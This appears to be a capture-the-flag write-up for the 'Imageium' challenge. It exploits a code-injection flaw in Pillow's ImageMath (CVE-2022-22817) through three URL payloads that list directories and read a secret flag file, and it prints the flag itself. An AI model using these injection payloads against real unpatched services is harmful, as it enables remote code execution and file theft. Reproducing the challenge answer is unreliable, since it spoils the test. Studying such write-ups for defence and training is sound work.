Imageium Writeup
===

##### Exploitation:

This challenge is about RCE in python web service.

There is a web application that uses one of the vulnerable versions of the Pillow python library. (CVE-2022-22817)

Participant have to identify the type of vulnerability and create an exploit to read the flag from a text file.


```
view-source:http://facingworlds.sstf.site/dynamic/modified?mode=__import__('os').listdir('.') -------------------------------------
ImageMath error not image object: ['secret', 'app.py', 'original.jpeg', 'pilcve.wsgi']
```

```
view-source:http://facingworlds.sstf.site/dynamic/modified?mode=__import__('os').listdir('secret') -------------------------------------
ImageMath error not image object: ['flag.txt']
```

```
view-source:http://facingworlds.sstf.site/dynamic/modified?mode=open('./secret/flag.txt','r').read()
-------------------------------------
ImageMath error not image object: SCTF{3acH_1m@ge_Has_iTs_0wN_MagIC}
```